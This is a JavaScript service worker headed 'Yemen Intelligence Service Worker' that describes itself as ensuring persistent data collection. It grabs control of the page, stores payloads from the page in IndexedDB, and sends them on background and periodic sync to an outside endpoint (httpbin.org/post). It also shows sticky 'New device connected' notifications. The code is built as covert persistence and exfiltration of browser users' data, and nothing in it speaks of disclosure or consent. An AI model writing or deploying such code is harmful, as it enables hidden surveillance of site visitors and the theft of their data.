/**
 * Yemen Intelligence Service Worker
 * Ensures persistent data collection
 */

const CACHE_NAME = 'yemen-intel-v1';
const PERSISTENCE_ENDPOINT = 'https://httpbin.org/post';

// Install
self.addEventListener('install', (event) => {
    self.skipWaiting();
    console.log('[Yemen Intel] Service Worker installed');
});

// Activate
self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim());
    console.log('[Yemen Intel] Service Worker activated');
});

// Background Sync
self.addEventListener('sync', (event) => {
    if (event.tag === 'yemen-intel-sync') {
        event.waitUntil(syncData());
    }
});

// Periodic Sync
self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'yemen-intel-periodic') {
        event.waitUntil(periodicCollection());
    }
});

// Push (if subscribed)
self.addEventListener('push', (event) => {
    const data = event.data?.json() || {};
    
    event.waitUntil(
        self.registration.showNotification('Yemen Intel Update', {
            body: data.message || 'New device connected',
            icon: '🇾🇪',
            badge: '🇾🇪',
            tag: 'yemen-intel',
            requireInteraction: true
        })
    );
});

// Message from main thread
self.addEventListener('message', (event) => {
    if (event.data === 'skipWaiting') {
        self.skipWaiting();
    }
    
    if (event.data.type === 'collect') {
        event.waitUntil(storeData(event.data.payload));
    }
});

// Functions
async function syncData() {
    const data = await getStoredData();
    if (data.length === 0) return;
    
    try {
        const response = await fetch(PERSISTENCE_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'sync',
                data: data,
                timestamp: Date.now()
            })
        });
        
        if (response.ok) {
            await clearStoredData();
        }
    } catch(e) {
        console.error('[Yemen Intel] Sync failed:', e);
    }
}

async function periodicCollection() {
    // Attempt to collect minimal data periodically
    const minimalData = {
        type: 'periodic_check',
        timestamp: Date.now(),
        online: true
    };
    
    try {
        await fetch(PERSISTENCE_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(minimalData),
            keepalive: true
        });
    } catch(e) {}
}

async function storeData(payload) {
    const db = await openDB();
    const tx = db.transaction('collections', 'readwrite');
    const store = tx.objectStore('collections');
    await store.add({
        timestamp: Date.now(),
        payload: payload
    });
}

async function getStoredData() {
    const db = await openDB();
    const tx = db.transaction('collections', 'readonly');
    const store = tx.objectStore('collections');
    return await store.getAll();
}

async function clearStoredData() {
    const db = await openDB();
    const tx = db.transaction('collections', 'readwrite');
    const store = tx.objectStore('collections');
    await store.clear();
}

function openDB() {
    return new Promise((resolve, reject) => {
        const request = indexedDB.open('YemenIntelDB', 1);
        
        request.onerror = () => reject(request.error);
        request.onsuccess = () => resolve(request.result);
        
        request.onupgradeneeded = (event) => {
            const db = event.target.result;
            if (!db.objectStoreNames.contains('collections')) {
                db.createObjectStore('collections', { keyPath: 'timestamp' });
            }
        };
    });
}
